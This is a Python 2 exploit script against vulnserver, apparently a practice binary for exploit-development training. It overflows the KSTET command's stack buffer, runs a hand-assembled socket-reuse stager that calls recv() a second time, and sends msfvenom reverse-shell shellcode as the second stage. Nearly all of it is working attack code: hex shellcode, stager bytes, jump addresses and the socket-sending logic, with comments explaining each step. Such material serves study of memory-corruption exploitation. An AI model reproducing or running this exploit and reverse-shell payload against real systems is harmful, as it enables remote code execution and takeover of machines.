#!/usr/bin/env python2

# Socket reuse Exploit for vulnserver
# Using Windows 7 SP1 (Developer Image from Microsoft - Win7IE8)

# The vulnerable function is the method "KSTET /XXXXXXX"

# Basic idea is to
# exploit the stack overflow
# jump to a stager that executes a second recv() using the same socket number (some tricks are needed and explained)
# send a second stage to the recv() 
# storing the second stage just after the 

import socket
import sys
import logging
import time

bad_chars="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# Offset calculated with mona pattern_create and mona pattern_offset
offset=70

# shellcode: we only have 1000 bytes
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 exitfunc=thread -f python  -b '\x00\x0a\x0d' -v shellcode
shellcode =  b""
shellcode += b"\xba\x19\xb8\x66\x91\xda\xcc\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e"
shellcode += b"\x03\x4f\xb6\x84\x64\x93\x2e\xca\x87\x6b\xaf"
shellcode += b"\xab\x0e\x8e\x9e\xeb\x75\xdb\xb1\xdb\xfe\x89"
shellcode += b"\x3d\x97\x53\x39\xb5\xd5\x7b\x4e\x7e\x53\x5a"
shellcode += b"\x61\x7f\xc8\x9e\xe0\x03\x13\xf3\xc2\x3a\xdc"
shellcode += b"\x06\x03\x7a\x01\xea\x51\xd3\x4d\x59\x45\x50"
shellcode += b"\x1b\x62\xee\x2a\x8d\xe2\x13\xfa\xac\xc3\x82"
shellcode += b"\x70\xf7\xc3\x25\x54\x83\x4d\x3d\xb9\xae\x04"
shellcode += b"\xb6\x09\x44\x97\x1e\x40\xa5\x34\x5f\x6c\x54"
shellcode += b"\x44\x98\x4b\x87\x33\xd0\xaf\x3a\x44\x27\xcd"
shellcode += b"\xe0\xc1\xb3\x75\x62\x71\x1f\x87\xa7\xe4\xd4"
shellcode += b"\x8b\x0c\x62\xb2\x8f\x93\xa7\xc9\xb4\x18\x46"
shellcode += b"\x1d\x3d\x5a\x6d\xb9\x65\x38\x0c\x98\xc3\xef"
shellcode += b"\x31\xfa\xab\x50\x94\x71\x41\x84\xa5\xd8\x0e"
shellcode += b"\x69\x84\xe2\xce\xe5\x9f\x91\xfc\xaa\x0b\x3d"
shellcode += b"\x4d\x22\x92\xba\xb2\x19\x62\x54\x4d\xa2\x93"
shellcode += b"\x7d\x8a\xf6\xc3\x15\x3b\x77\x88\xe5\xc4\xa2"
shellcode += b"\x1f\xb5\x6a\x1d\xe0\x65\xcb\xcd\x88\x6f\xc4"
shellcode += b"\x32\xa8\x90\x0e\x5b\x43\x6b\xd9\x1b\x94\x73"
shellcode += b"\x18\x8c\x96\x73\x0f\xff\x1e\x95\x45\xef\x76"
shellcode += b"\x0e\xf2\x96\xd2\xc4\x63\x56\xc9\xa1\xa4\xdc"
shellcode += b"\xfe\x56\x6a\x15\x8a\x44\x1b\xd5\xc1\x36\x8a"
shellcode += b"\xea\xff\x5e\x50\x78\x64\x9e\x1f\x61\x33\xc9"
shellcode += b"\x48\x57\x4a\x9f\x64\xce\xe4\xbd\x74\x96\xcf"
shellcode += b"\x05\xa3\x6b\xd1\x84\x26\xd7\xf5\x96\xfe\xd8"
shellcode += b"\xb1\xc2\xae\x8e\x6f\xbc\x08\x79\xde\x16\xc3"
shellcode += b"\xd6\x88\xfe\x92\x14\x0b\x78\x9b\x70\xfd\x64"
shellcode += b"\x2a\x2d\xb8\x9b\x83\xb9\x4c\xe4\xf9\x59\xb2"
shellcode += b"\x3f\xba\x7a\x51\x95\xb7\x12\xcc\x7c\x7a\x7f"
shellcode += b"\xef\xab\xb9\x86\x6c\x59\x42\x7d\x6c\x28\x47"
shellcode += b"\x39\x2a\xc1\x35\x52\xdf\xe5\xea\x53\xca"

###############################################
# Reuse explanation:
# [KSTET] + [stager] + [NOPS] + [JMP ESP] + [ JMP back 76 bytes ]
#           ^-----------------------------------------------|

# After the stack overflow and at the beginning of the stager we can use the debugger to find that: 
# - recv is @ 0x0040252C
# - socket number is on the stack, available 0x188 bytes ahead (more) of the current esp value

# Let's build  the stager as:
# - Save ESP on stack
# push esp
# - Retrieve esp value into ax
# pop eax
# - Go ahead to where the socket number is stored on the stack
# add ax,0x188
#- Now Ax points to the socket number
# - but we have to make space on the stack (100 bytes)
# sub esp, 0x64
# - Now we have to prepare a second recv() call
# - push a NULL on the stack
# xor   ebx, ebx
# push  ebx
# - push the lenght of the buffer for recv() (1024 -> 0x400). Trick using bh to avoid null bytes in the shellcode
# add   bh, 0x4
# push  ebx
# - next we have to give recv() the address where to store the received data
# - easy solution is to put it directly where our EIP is now
# - looking in the stack we see that our EIP + 100 bytes is exaclty inside the NOPs (near the end of them)
# we can then use ebx to add these 0x64 and push on the stack
# push  esp
# pop   ebx
# add   ebx, 0x64
# push  ebx
# - Final argument is to push the socket number with
# push  dword ptr ds:[eax]
# - Last stager action is to call recv() that will put the shellcode on the stack near the NOPS
# WE have to use shift to create a null byte for address 0x0040252C
# mov   eax, 0x40252C90
# shr   eax, 8
# call  eax

#The final stager shellcode is the following

stager =  '\x54\x58\x66\x05\x88\x01\x83\xec'
stager += '\x64\x33\xdb\x53\x80\xc7\x04\x53'
stager += '\x54\x5b\x83\xc3\x64\x53\xff\x30'
stager += '\xb8\x90\x2c\x25\x40\xc1\xe8\x08'
stager += '\xff\xd0'


# Build the first stage with KSTET overflow + stager 
# Now Building the payload
buf = "KSTET "
buf += stager
buf += "\x90"* (offset - len(stager))
# JMP ESP
buf += "\xeb\x11\x50\x62"
# jumps back 76 bytes (start of stager)
buf += "\xeb\xb4" 
# Finally linefeed to send the buffer
buf += '\r\n'



if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

# Receives the hello message
rec_data= s.recv(1024)
print rec_data

# Send first stage
s.send(buf)

print '[*] Sent stager, waiting 5 seconds...'

time.sleep(5)

s.send(shellcode + '\x90' * (1024 - len(shellcode)))

s.close()
